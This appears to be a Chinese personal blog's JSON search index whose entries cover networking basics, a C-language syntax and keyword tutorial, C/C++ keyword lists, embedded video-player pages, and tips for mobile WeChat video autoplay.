无论是公有地址还是私有地址，都能通过划分为多个子网。子网掩码就是用来划分子网的一个32位二进制地址，1表示网络位，0表示主机位。将一个IP地址与子网掩码进行\u0026运算，主机号会被屏蔽（变成全0），就可以得到网络号地址。 ","date":"2021-10-22","objectID":"/zh-cn/22/:5:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"网关 不同网段的网络无法直接通信，需要经过各自网络的网关来互相通信。网关实质上是一个网络通向其他网络的IP地址。 网关的IP地址是具有路由功能的设备的IP地址，具有路由功能的设备有路由器、启用了路由协议的服务器（实质上相当于一台路由器）、代理服务器（也相当于一台路由器）。网关也被称为IP路由器。 一台主机可以有多个网关。默认网关的意思是一台主机如果找不到可用的网关，就把数据包发给默认指定的网关，由这个网关来处理数据包。现在主机使用的网关，一般指的是默认网关。 ","date":"2021-10-22","objectID":"/zh-cn/22/:6:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"DNS服务器 DNS即域名服务器（Domain Name Server）。由于IP地址都是数字，不方便记忆，于是就有了域名。通过DNS将域名解析为对应的IP，这样就可以通过访问域名来访问到对应的IP地址。 ","date":"2021-10-22","objectID":"/zh-cn/22/:7:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"参考链接 关于公网IP和私有IP的区别 子网的划分 和私有地址的区别和用处的不同在哪 【Network】 计算机网络基础知识总结 IP地址，子网掩码，默认网关，DNS服务器详解 ","date":"2021-10-22","objectID":"/zh-cn/22/:8:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["Moive"],"content":"西游记红孩儿 .dplayer { position: relative; width: 100%; height: auto; margin: 3% auto; text-align: center; } function loadDPlayer(){ let dp = new DPlayer({ container: document.getElementById(\"Mr·Yang\"), autoplay: \"true\", theme: \"#b7daff\", loop: \"true\", lang: \"zh-cn\", screenshot: true , hotkey: true , preload: \"none\", logo: \"\", volume: 0.7 , mutex: true , video: { url: \"https://new.iskcd.com/20211020/wRQTgaSI/1400kb/hls/playlist.m3u8\", pic: \"https://cdn.04pic.com/image/617018125eef2.jpg\", thumbnails: \"\", type: \"auto\", }, subtitle: { url: \"\", type: \"webvtt\", fontSize: \"20px\", bottom: \"10%\", color: \"#b7daff\", }, }); } document.addEventListener('DOMContentLoaded', loadDPlayer, !1); ","date":"2021-10-21","objectID":"/zh-cn/2021-10-20-1/:0:0","tags":["电影"],"title":"西游记红孩儿2021","uri":"/zh-cn/2021-10-20-1/"},{"categories":["Moive"],"content":"《春光灿烂猪八戒》 .dplayer { position: relative; width: 100%; height: auto; margin: 3% auto; text-align: center; } function loadDPlayer(){ let dp = new DPlayer({ container: document.getElementById(\"highline\"), autoplay: \"true\", theme: \"#b7daff\", loop: \"true\", lang: \"zh-cn\", screenshot: true , hotkey: true , preload: \"none\", logo: \"\", volume: 0.7 , mutex: true , video: { url: \"https://cdn5.tvtvgood.com/202110/18/ee52ee5086d9/playlist.m3u8?st=rhdJDxQQVpbxH273gnFDig\\u0026e=1634793636\", pic: \"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fnimg.ws.126.net%2F%3Furl%3Dhttp%253A%252F%252Fdingyue.ws.126.net%252F2021%252F1021%252F0dc786c4j00r1b5gl003ac000xc00lbm.jpg%26thumbnail%3D650x2147483647%26quality%3D80%26type%3Djpg\\u0026refer=http%3A%2F%2Fnimg.ws.126.net\\u0026app=2002\\u0026size=f9999,10000\\u0026q=a80\\u0026n=0\\u0026g=0n\\u0026fmt=jpeg?sec=1637385496\\u0026t=b7f22b3ff3477bf447deb4e68439fb21\", thumbnails: \"\", type: \"auto\", }, subtitle: { url: \"\", type: \"webvtt\", fontSize: \"20px\", bottom: \"10%\", color: \"#b7daff\", }, }); } document.addEventListener('DOMContentLoaded', loadDPlayer, !1); ","date":"2021-10-21","objectID":"/zh-cn/2021-10-20/:0:0","tags":["电影"],"title":"视频测试","uri":"/zh-cn/2021-10-20/"},{"categories":["声明"],"content":"声明：有些文章为原创! 所以就有了下面的规则！ 此文为加密收费内容添加我微信支付后可看: ","date":"2021-10-19","objectID":"/zh-cn/%E5%A3%B0%E6%98%8E/:0:1","tags":["声明"],"title":"声明","uri":"/zh-cn/%E5%A3%B0%E6%98%8E/"},{"categories":[],"content":"本篇文章主要讲解C语言 基本语法,这里提供简单的示例和代码来详细讲解C语言的基本语法，开始学习C语言的朋友可以看一下，希望能够给你带来帮助 目录 1、标识符与关键字 2、常量和符号常量 （1）常量和常量符号 （2）变量 3、C语言数据类型 （1）整型常量 整型变量 原码、反码和补码 (2)实型数据 实型常量 实型变量 实型变量的定义以及初始化 (3)字符型数据 ASCII码 字符型变量 转义字符字符 字符串常量 字符串变量 总结 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:0:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"1、标识符与关键字 给变量所取的名字叫变量名，定义变量的名字需要遵循标识符的命名规则。 标识符是用来标识变量、符号常量、数组、函数、文件等名字的有效字符序列。 标识符的命名规则： 1.只能由字母、数字和下划线组成（例如：Score1，Stu_name） 2.第一个字符必须为字母或下划线 3.区分大小写字母 4.C语言内部规定的标识符（即关键字）不能作为用户标识 C语言的关键字： C语言的关键字，是保留的一些特殊作用的词语，一共32个关键字 关键字 说明 auto 声明自动变量 break 跳出当前循环 case 开关语句分支 char 声明字符型变量或函数返回值类型 const 定义常量，如果一个变量被 const 修饰，那么它的值就不能再被改变 continue 结束当前循环，开始下一轮循环 default 开关语句中的\"其它\"分支 do 循环语句的循环体 double 声明双精度浮点型变量或函数返回值类型 enum 声明枚举类型 extern 声明变量或函数是在其它文件或本文件的其他位置定义 float 声明浮点型变量或函数返回值类型 for 一种循环语句 goto 无条件跳转语句 if 条件语句 int 声明整型变量或函数 long 声明长整型变量或函数返回值类型 register 声明寄存器变量 return 子程序返回语句（可以带参数，也可不带参数） unsigned 声明无符号类型变量或函数 union 声明共用体类型 void 声明函数无返回值或无参数，声明无类型指针 volatile 说明变量在程序执行中可被隐含地改变 while 循环语句的循环条件 C99新建关键字： _Bool `、`_Complex` 、`_Imaginary` 、`inline `、`restrict C11新建关键字： _Alignas `、`_Alignof `、`_Atomic `、`_Generic `、`_Noreturn`、`_Static_assert `、`_Thread_local ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:1:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"2、常量和符号常量 常量：在程序运行过程中，其值不会发送变化的量。 变量：在程序运行过程中，其值可以发送变化的量 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:2:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"（1）常量和常量符号 C语言提供的常量类型有整型常量、实型常量、字符常量、字符串常量和符号常量。 用一个标识符来代表一个常量，该标识符叫做符号常量，其一般形式为： #define 标识符 常量 例如： #define PI 3.1415926 关于typede和defin的用法与区别： 1.#defien是预处理指令，在编译预处理时进行简单替换，不作正确性检查，不管含义是否正确照样带入，只要在编译器已被展开的源程序时才会发现可能的错误并报错。 例如：#define PI 3.1415926 程序：area = PIrr替换3.1415926r 2.rtypedef是在编译时处理的，通常是用于对已有数据类型取别名，而#define只是简单地替换。 例如：typedef unsigned int uint; 这样就为unsigned int型引入新助记符uint，以后使用uint直接代表unsigned int型。 例如：typedef PI 3.1515926； 编译器会直接报错，原因PI并非已存在类型，其次“3.1515926”不符合命名规则。 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:2:1","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"（2）变量 1.变量在内存中占用一定的储存单元，在该储存单元中存放变量值。 2.程序中用到的所有变量都必须有一个变量名 3.变量名和变量值是两个不同的概念 4.不同类型的变量在内存中占据储存单元的数量及储存的格式不相同，例如：char ch = ‘1';int i = 1; 5.变量必须“先定义后使用”，这样做的目的是： 1、便于编译程序程序检测对该变量的运算是否合法。例如：整型变量可以进行求模（余数）运算，实型变量不可以进行求模运算。 2、程序中变量名的正确使用 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:2:2","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"3、C语言数据类型 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:3:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"（1）整型常量 整型常量就是整数，有3种表示形式 1.十进制整常数：就是通常整数的写法，数码取值为0-9。例如：25、-623、0等 2.八进制整数：以0为前缀，数码取值0-7， 例如： 020（十六进制16） 016（十六进制14） 0177777（十六进制65535） -010（十进制数-8） 几种不合法的八进制数： 256（无前缀0） 079（包含了非八进制数码9） 3.十六进制整型常数：以数字和字母0x开头，即0x作为前缀，数码的取值为0-9和A-F（或字母a-f） 几种合法的十六进制数： 0x2A（十进制数42） 0x1AB0（十进制数6832） 几个不合法 的十六进制数： 5A（无前缀）、0x2H（包含了非十六进制数码H） 整型变量 整型变量分为：基本整型、长整型、短整型、无符号型 整型变量的定义及初始化： 定义变量及初始化的一般形式 为： 类型说明符 变量名1 = 值1 例如： int``a,b,c;``//定义a，b，c为整型变量``long``x=10;``//定义x为长整型变量，并附初值10``unsigned``int``p=2,q=5,m;``//定义p，q，m为无符号整型变量。p赋初值为2，q赋初值为5 整型变量需要注意： 1、允许在一个类型说明符后，定义多个相同类型变量，类型说明符与变量名之间至少用一个空格间隔，各变量名之间用逗号间隔 2、最后一个变量名后面用“；”号结尾 3、变量定义必须放在变量使用之前，一般放在函数体开头 4、没有给变量赋初值，并不意味着该变量中没有数值，只表面给变量中没有确定的值，因此直接使用这种变量的话可能产生莫名其妙的结果，有可能导致运算错误 例程： #include \u003cstdio.h\u003e``void` `main(``void``)``{`` ``int` `a = 3, b = 5, c, d;`` ``c = a+b;`` ``d = a-b;`` ``printf``(``\"a+b=%d,a-b=%d\\n\"``,c,d);``} 原码、反码和补码 计算机中数分为有符号和无符号。他们是以二进制形式表示的，有三种表示方法，即原码和补码。 三种表示方式由符号位和数值位两部分构成 符号位在最高位，用0表示“正”，1表示“负”。 取余位为数值位 原码：按照二进制的方法来表示数的绝对值，用这个方法得到的就是数的原码。 反码：正数的反码与其原码相同，负数的反码为其原码除符号位以外的各位 按为取反。 补码：正数的补码与其原码相同，负数的补码是将其原码除符号位之外的各位求反之后，在末位再加1 正数的原码、反码。补码相同；负数的原码、反码、补码不同。数值在计算机中以补码形式存放。 例如：求-127的补码 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:3:1","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"(2)实型数据 实型数据又称为实数或浮点数，指是带有小数部分的非整数数值。 实型常量 在C语言中，实数常量只能用十进制数表示，有两种表示方法： 1.小数形式：由数字0~9和小数点组成，当小数部分为零时，小数点不能省略。例如：0.0/24.4、-56.33等均为合法的实型常量 2.指数形式：由十进制数、加阶码标志小写字母“e”（或大写字母“E”）和阶码（必须是整数）组成。 例如：2.3E5（相当于2.3 x 10^5） 以下是不合法的实型常量： 123（无小数点） E4（阶码“E”之前无数字） 23.-E3（负号的位置不对） 2.7E（无阶码） 实型变量 实型变量的定义以及初始化 例如： float``a,b,c;``//定义a，b，c为单精度实型变量``double``m=3.5,n=5.6;``//定义m，n为双精度实型变量，并分别赋值3.5和5.6 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:3:2","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"(3)字符型数据 字符常量是用一对单引号括起来的一个字符 例 如：‘b'、‘z'、‘='、‘?'、‘5' 字符常量特点： 1.字符常量只能是单个字符，不能是多个字符 2.字符常量是以ASCII码形式储存，一个字符常量占用一个字节空间。 ASCII码 ASCII码表示American Standrd Code for Information Interchange。ASCII编码能表示数据范围是00000000~11111111共2^8即256个数据 标准的ASCII码有128个字符，其中： 1.0-31为控制字符，例如，回车换行、文件结束标志、字符串结束标志 2.10个阿拉伯‘0'~‘9’的码值是连续的 3.26个大写字母‘A'-‘Z’是连续的，26和大小写字母‘a'-‘z’是连续的 4.字符常量也可以参与各种运算，如：‘B'-‘A’值为1（字符‘B’的ASCII码值减去66字符‘A’的ASCII码值65结果为1） 字符型变量 1.字符型变量在内存中占用1个字节，只能存放一个字符，并以该字符的ASCII码的值的形式存放 2.在C语言中，一个字符型数据可以按照它的ASCII码进行数据运算 字符型数据储存空间和值范围 类型 字节数 取值范围 char 1 -128~127 unsigned char 1 0~255 例程：给字符变量赋整数值 #include \u003cstdio.h\u003e``int` `main()``{`` ``char` `ch1=65,ch2=66;`` ``printf``(``\"%c,%c\\n\"``,ch1,ch2);`` ``printf``(``\"%d,%d\\n\"``,ch1,ch2);``} 转义字符字符 转义字符：是由一个反斜杠““后跟规定，具有特定含义的字符 常用转义字符如下表 转义字符使用如下： #include \u003cstdio.h\u003e``int` `main()``{`` ``printf``(``\"\\\"china\\\"\\n\"``);`` ``printf``(``\"My \\tCountry.\\n\"``);`` ``printf``(``\"I am hap\\160\\x79.\\n\"``);``} 字符串常量 字符串常量是简称字符串，是用一对双撇号（西方双引号英文）括起来的一串字符，包含字符的个数和字符长度 例如：“Hello World”。“a”，“C语言”都是字符串常量。 字符串常量和字符常量区别： 1.字符常量是右边单引号括起来的字符，而字符串常量是由双引号括起来的字符。尽管‘a’与“a”都包含一个字符，但在C程序中，它们都具有不同的含义 2.字符常量只能是一个字符，字符串常量可以是多个字符 3.可以把一个字符串常量赋值一个字符变量，但不能把一个字符常量赋值一个字符变量。 字符串变量 在C语言中没有专门的字符串类型，我们只能使用数组或者指针来间接地存储字符串。 char` `str1[] = ``\"Hello World!\"``char` `*str2 = ``\"你好世界！\" str1 和 str2 是字符串的名字，后边的[]和前边的*是固定的写法。初学者暂时可以认为这两种存储方式是等价的，它们都可以通过专用的 puts 函数和通用的 printf 函数输出。 #include \u003cstdio.h\u003e``int` `main()``{`` ``char` `web_url[] = ``\"hHello World!\"``;`` ``char` `*web_name = ``\"你好世界\"``;`` ``puts``(web_url);`` ``puts``(web_name);`` ``printf``(``\"%s\\n%s\\n\"``, web_url, web_name);`` ``return` `0;``} ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:3:3","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"总结 本篇文章就到这里了，希望能够给你带来帮助 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19-1/:4:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言的基本语法","uri":"/zh-cn/2021-10-19-1/"},{"categories":[],"content":"C语言关键字（C90，C99，C11） “关键字”是对 C 编译器具有特殊含义的单词。 在翻译的第 7 和第 8 阶段中，标识符不能具有与 C 关键字相同的拼写和大小写。 有关详细信息，请参阅《预处理器参考》中的翻译阶段。 有关标识符的详细信息，请参阅标识符。 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19/:0:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言关键字","uri":"/zh-cn/2021-10-19/"},{"categories":[],"content":"标准 C 关键字 C 语言使用下列关键字： auto break case char const continue default do double else enum extern float for goto if inline int long register restrict return short signed sizeof static struct switch typedef union unsigned void volatile while _Alignas _Alignof _Atomic _Bool _Complex _Generic _Imaginary _Noreturn _Static_assert _Thread_local 1 ISO C99 中引入的关键字。 2 ISO C11 中引入的关键字。 a 从 Visual Studio 2019 版本 16.8 开始，如果指定了 /std:c11 或 /std:c17 编译器选项，将在编译为 C 的代码中支持这些关键字。 b 从 Visual Studio 2019 版本 16.8 开始，如果指定了 /std:c11 或 /std:c17 编译器选项，这些关键字将由编译器在编译为 C 的代码中识别，但不受支持。 不能重新定义关键字。 但是，你可以在编译前通过使用 C 预处理器指令指定文本来替换关键字。 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19/:1:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言关键字","uri":"/zh-cn/2021-10-19/"},{"categories":[],"content":"Microsoft 专用 C 关键字 ANSI 和 ISO C 标准允许为编译器实现保留带有两个前导下划线的标识符。 Microsoft 的惯例是在 Microsoft 专用关键字名称前加上双下划线。 这些单词不能用作标识符名称。 有关标识符命名规则的说明，包括双下划线的使用，请参阅标识符。 下列关键字和特殊标识符由 Microsoft C 编译器识别： __asm __based __cdecl __declspec __except __fastcall __finally __inline __int16 __int32 __int64 __int8 __leave __restrict __stdcall __try dllexport dllimport naked static_assert thread 3 __based 关键字对 32 位和 64 位目标编译的用途有限。 4 当与 __declspec 一起使用时，这些关键字是特殊的标识符；它们在其他情况下的使用不受限制。 5 为了与以前的版本兼容，当启用 Microsoft 扩展时，这些关键字既可以使用两个前导下划线，也可以使用一个前导下划线。 6 如果不包括 \u003cassert.h\u003e，则 Microsoft Visual C 编译器会将 static_assert 映射到 C11 _Static_assert 关键字 。 默认情况下将启用 Microsoft 扩展。 为了帮助创建可移植的代码，可以在编译过程中指定 /Za (禁用语言扩展) 选项来禁用 Microsoft 扩展。 如果使用此选项，将禁用某些 Microsoft 专用关键字。 启用 Microsoft 扩展时，您可在程序中使用上面列出的关键字。 为了符合语言标准一致性，其中大多数的关键字是以双下划线开头的。 dllexport、dllimport、naked 和 thread 这 4 个关键字除外，它们只与 __declspec 一起使用，不需要前导双下划线。 为了向后兼容，支持其余的关键字的单下划线版本。 ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19/:2:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言关键字","uri":"/zh-cn/2021-10-19/"},{"categories":[],"content":"请参阅 C 的元素 关键字 ( keyword)：word or identifier that has a particular meaning to the programming language； 保留字 ( reserved word)：a reserved word is a word that cannot be used as an identifier, and a reserved word may have no meaning. 关键字是对编程语言有特定含义的词或标识符，保留字是不能定义为标识符的词，为系统保留，有些保留字可能并没有什么意义。例如java中的goto保留字，它并不是关键字，没有什么具体含义，仅为系统保留而已。 说了那么多，其实，，c和c++是不区分保留字和关键字的，c和c++所有的保留字都是关键字。 c/c++关键字（摘自cppreference.com）： auto break case char const continue default do double else enum extern float for goto if inline (since C99) int long register restrict (since C99) return short signed sizeof static struct switch typedef union unsigned void volatile while _Alignas (since C11) _Alignof (since C11) _Atomic (since C11) _Bool (since C99) _Complex (since C99) _Generic (since C11) _Imaginary (since C99) _Noreturn (since C11) _Static_assert (since C11) _Thread_local (since C11) alignas (since C++11) alignof (since C++11) and and_eq asm atomic_cancel (TM TS) atomic_commit (TM TS) atomic_noexcept (TM TS) auto(1) bitand bitor bool break case catch char char16_t (since C++11) char32_t (since C++11) class(1) compl concept (since C++20) const constexpr (since C++11) const_cast continue co_await (coroutines TS) co_return (coroutines TS) co_yield (coroutines TS) decltype (since C++11) default(1) delete(1) do double dynamic_cast else enum explicit export(1) extern(1) false float for friend goto if import (modules TS) inline(1) int long module (modules TS) mutable(1) namespace new noexcept (since C++11) not not_eq nullptr (since C++11) operator or or_eq private protected public register(2) reinterpret_cast requires (since C++20) return short signed sizeof(1) static static_assert (since C++11) static_cast struct(1) switch synchronized (TM TS) template this thread_local (since C++11) throw true try typedef typeid typename union unsigned using(1) virtual void volatile wchar_t while xor xor_eq 上边一个表格是c关键字，下面一个表格为c++关键字 (1) - meaning changed or new meaning added in C++11. Note: the keyword export is also used by Modules TS. (2) - meaning changed in C++17. c++关键字分类： 数据类型：void，int，char，float，double，bool，w_char 类型定义：struct，union，enum，class，typedef 常量值：true，false 类型修饰符：long，short，singed，unsigned 类型限定符：const，volatile，restrict 存储说明符：auto，register，static，extern，thread_local，mutable 其它修饰符：inline，asm 循环控制：for，while，do 跳转控制：break，continue，return，goto 分支结构： if，else，switch，case，default 内存管理：new, delete 运算符：sizeof，and，and_eq，bitand，bitor，compl，not，not_eq，or，or_eq，xor，xor_eq 访问限定符：this，friend，virtual，mutable，explicit，operator 类访问修饰符：private，protected，public 模板：template，typename 命名空间：namespace，using 异常处理：throw，try，catch ","date":"2021-10-19","objectID":"/zh-cn/2021-10-19/:3:0","tags":["开发","编程","语言","C/C++"],"title":"重学C语言关键字","uri":"/zh-cn/2021-10-19/"},{"categories":["开发"],"content":"Hi , Github.Dev 这也太太太太方便了吧！一点即开，自动保存，配合 Actions ，完完全全是各静态博客的自带管理后台呀！ 虽然不支持很多插件，但支持自定义代码段，发发文错错有余～ ","date":"2021-10-18","objectID":"/zh-cn/higithubdev/:1:0","tags":["折腾"],"title":"Hi, GithubDev","uri":"/zh-cn/higithubdev/"},{"categories":null,"content":"正在收集整理中…… ","date":"2021-10-18","objectID":"/zh-cn/books/:0:0","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"1.Apple: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:1","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"2.Mac: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:2","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"3.IOS: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:3","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"4.Android: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:4","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"5.Linux: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:5","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"6.Windows: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:6","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"7.wxwork: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:7","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"8.Other: ","date":"2021-10-18","objectID":"/zh-cn/books/:0:8","tags":null,"title":"文档书籍📚","uri":"/zh-cn/books/"},{"categories":null,"content":"计算机装机维护网站: 🐟小鱼儿YR ☁️IT天空 ⏬原版系统下载 👻Ghost系统下载 🔧系统总裁 🖨️打印机驱动下载 编程语言总集: ","date":"2021-10-18","objectID":"/zh-cn/sources/:0:0","tags":null,"title":"资源分享","uri":"/zh-cn/sources/"},{"categories":null,"content":"汇编(面向机器的程序设计语言) 典型的现代汇编器（assembler）建造目标代码，由解译组语指令集的助记符（Mnemonics）到操作码，并解析符号名称（Symbolic names）成为存储器地址以及其它的实体。使用符号参考（symbolic references）是汇编器的一个重要特征，它可以节省修改程序后人工转址（manual address updates）的乏味耗时计算。基本就是把机器码变成一些字母而已，编译的时候再把输入的指令字母替换成为晦涩难懂的机器码。 1.ISA(Instruction Set architecture)：指令架构 Machine code：机器码 Assembly Language：汇编语言 Rust(后端) 2.Rust 速度惊人且内存利用率极高。由于没有运行时和垃圾回收，它能够胜任对性能要求特别高的服务，可以在嵌入式设备上运行，还能轻松和其他语言集成。 ","date":"2021-10-18","objectID":"/zh-cn/sources/:1:0","tags":null,"title":"资源分享","uri":"/zh-cn/sources/"},{"categories":["开发"],"content":" 早期因为带宽和流量的因素，移动端浏览器禁止视频自动播放，现在 WI-FI 越来越普及，流量也便宜了，所以有些必要自动播放的，可以支持自动播放了。 在移动端浏览器， video 在用户点击播放或者通过 API video.play() 触发播放时，会强制以全屏置顶的形式进行播放，设计的初衷可能是因为全屏能提供更好的用户体验。 \u003cvideo id=\"player\" controls autoplay x5-video-player-type=\"h5\" playsinline=\"true\" webkit-playsinline=\"true\" x-webkit-airplay=\"true\" x5-video-orientation=\"portraint\" x5-video-player-fullscreen=\"true\"\u003e \u003csource src=\"...\" type=\"video/mp4\"\u003e playsinline=“true” webkit-playsinline=“true 解决 iOS 自动播放全屏问题 x5-video-player-type=“h5” x5-video-player-fullscreen=“true” 解决安卓同层级播放 iOS 微信下通过 WeixinJSBridgeReady 事件进行自动播放 document.addEventListener( 'WeixinJSBridgeReady', function() { var video = document.getElementById(\"player\"); video.play(); }, false ); Android 可以尝试监听 touchstart 事件，用户触摸屏幕后自动播放 document.addEventListener('touchstart', function(){ var video = document.getElementById(\"player\"); video.play(); }, false); ","date":"2021-10-18","objectID":"/zh-cn/wechat/:0:0","tags":["折腾"],"title":"前端Video 微信浏览器自动播放和默认全屏","uri":"/zh-cn/wechat/"}]